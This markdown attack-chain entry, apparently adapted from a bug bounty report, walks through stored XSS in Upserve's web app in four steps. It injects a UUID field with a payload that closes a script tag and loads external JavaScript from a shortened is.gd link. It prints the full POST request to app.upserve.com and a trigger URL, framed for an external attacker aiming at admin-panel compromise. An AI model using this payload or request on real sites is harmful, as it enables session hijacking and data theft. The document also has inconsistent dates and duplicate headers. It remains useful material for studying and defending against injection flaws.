---
tags:
  - xss
  - stored-xss
  - web-vuln
  - uuid-injection
type: attack_chain
tools:
  - '[[tools/is-gd-url-shortener]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/post-malicious-uuid-form-urlencoded]]'
  - '[[commands/post-malicious-uuid-json]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Discover-UUID-Validation-Weakness]]'
  - '[[procedures/Craft-Malicious-UUID-Payload]]'
  - '[[procedures/Submit-Malicious-UUID-via-POST]]'
  - '[[procedures/Trigger-Stored-XSS]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
description: >-
  Multi-stage attack chain exploiting a stored XSS vulnerability by submitting a
  malicious UUID to execute arbitrary JavaScript on admin panels.
skill_level: intermediate
impact_level: high
id: d11fc132-5d23-403a-8746-0f3a6d65f345
created_at: '2025-12-13T23:56:20.247Z'
updated_at: '2025-12-13T23:56:20.247Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Stored XSS via Malicious UUID Submission in Upserve

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discover Weakness] --> B[Craft Payload]
    B --> C[Submit Payload]
    C --> D[Trigger XSS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/is-gd-url-shortener]]

### Target Environment

- Target OS/Platform: Web
- Required services/ports: HTTPS access to app.upserve.com
- Network access requirements: Internet access to submit requests

### Initial Access Requirements

- Credential requirements: None (public endpoint)
- Network position: External attacker
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Discover UUID Validation Weakness
procedure: [[procedures/Discover-UUID-Validation-Weakness]]

**Objective**: Identify that the system allows submission of arbitrary UUIDs without proper character validation.

**Instructions**: Analyze the /c/user endpoint to observe that it accepts UUID values with only length restrictions, no character sanitization. Test by submitting sample UUIDs and inspecting responses.

**Expected Output**: Confirmation that arbitrary characters are accepted and stored.

**Success Indicators**:
- UUIDs with special characters are not rejected
- Values are rendered without escaping in HTML/JS contexts

### Step 2: Craft Malicious UUID Payload
procedure: [[procedures/Craft-Malicious-UUID-Payload]]

**Objective**: Create a UUID that injects XSS by closing a script tag and loading an external script.

**Instructions**: Use [[tools/is-gd-url-shortener]] to shorten a URL to malicious JS (e.g., //is.gd/z0i2sU). Craft the payload as '</script><script src=//is.gd/z0i2sU>' to fit length limits.

**Expected Output**: A valid malicious UUID string ready for submission.

**Success Indicators**:
- Payload closes existing script and injects new one
- Length fits restrictions

### Step 3: Submit Malicious UUID via POST
procedure: [[procedures/Submit-Malicious-UUID-via-POST]]

**Objective**: Send the crafted UUID to the endpoint to store the XSS payload.

**Instructions**: Execute [[commands/post-malicious-uuid-form-urlencoded]] to submit the payload:

```bash
POST /c/user HTTP/1.1
Host: app.upserve.com
Accept: application/json
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://app.upserve.com/settings/account
Content-Length: 134
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close

uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
```

Alternatively, test with [[commands/post-malicious-uuid-json]] (note: server may override UUID in JSON format).

**Expected Output**: HTTP response confirming user creation with the malicious UUID stored.

**Success Indicators**:
- Successful user creation
- Payload stored without sanitization

### Step 4: Trigger Stored XSS
procedure: [[procedures/Trigger-Stored-XSS]]

**Objective**: Visit a page where the UUID is rendered to execute the injected script.

**Instructions**: Navigate to https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=... which displays the UUID in a YUI namespace, triggering the XSS.

**Expected Output**: Execution of the external script, potentially alerting or logging success.

**Success Indicators**:
- Script executes in the browser
- Arbitrary JS runs on affected pages, such as admin panels

## Attack Chain Summary

### Key Achievements

1. Identification of validation weakness in UUID submission
2. Successful storage of XSS payload
3. Execution of arbitrary JavaScript leading to potential account takeover or data theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

*Last updated: 2023-10-01*
